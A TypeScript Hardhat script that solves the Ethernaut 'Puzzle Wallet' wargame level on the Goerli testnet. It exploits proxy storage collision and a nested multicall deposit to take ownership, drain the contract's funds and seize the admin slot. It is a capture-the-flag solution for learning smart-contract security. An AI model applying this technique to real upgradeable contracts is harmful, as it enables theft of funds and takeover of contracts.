import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackPuzzleWallet = async () => {
    // change contract addresses here.
    const puzzleWalletAddress = "0xAc7EcD98B60C2094BdD63eEaF73436ebE8A28e9a"; //type "await contract.address()" in ethernaut console
    const playerAddress = "";

    // Don't touch below
    // The vulnerability here arises due to storage collision between the proxy contract (PuzzleProxy) and logic contract (PuzzleWallet)
    // You may read more on:
    // https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how
    // https://blog.openzeppelin.com/proxy-patterns/
    // sample table below to compare storage
    // slot | PuzzleWallet  -  PuzzleProxy
    // ----------------------------------
    //  0   |   owner      <-  pendingAdmin
    //  1   |   maxBalance <-  admin
    //  2   |           .
    //  3   |           .

    const provider = await ethers.getDefaultProvider("goerli");
    /*Private Keys in .env file or hardcode here*/
    const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
    const wallet = new Wallet(PRIVATE_KEY, provider);

    const params = playerAddress;
    const funcSign = ["function proposeNewAdmin(address _newAdmin) external"];
    const iface = new ethers.utils.Interface(funcSign);
    const data = iface.encodeFunctionData("proposeNewAdmin", [params]);
    const tx1 = await wallet.sendTransaction({
        from: playerAddress,
        to: puzzleWalletAddress,
        data: data,
    });
    const txReceipt1 = await tx1.wait(1);
    console.log(txReceipt1);
    // check below that player is now owner
    // TODO:

    const contractPuzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleWalletAddress);
    const tx2 = await contractPuzzleWallet.addToWhitelist(playerAddress);
    // get balance of puzzle contract
    const puzzleWalletBalance = await provider.getBalance(puzzleWalletAddress);
    console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance}`);
    // TODO: fill in function call signature
    const depositData = contractPuzzleWallet.interface.encodeFunctionData("deposit");
    const multicallData = contractPuzzleWallet.interface.encodeFunctionData("multicall", [
        [depositData],
    ]);
    const tx3 = await contractPuzzleWallet.multicall([multicallData, multicallData], {
        value: ethers.utils.parseEther("0.001"),
    });
    // check balance after here
    // execute to drain
    const tx4 = await contractPuzzleWallet.execute(
        playerAddress,
        ethers.utils.parseEther("0.002"),
        "0x"
    );
    // puzzlew wallet balance should be 0
    console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance} (Should be 0 here)`);
    //set maxbalance to change owner to player
    const tx5 = await contractPuzzleWallet.setMaxBalance(playerAddress);
};

attackPuzzleWallet()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
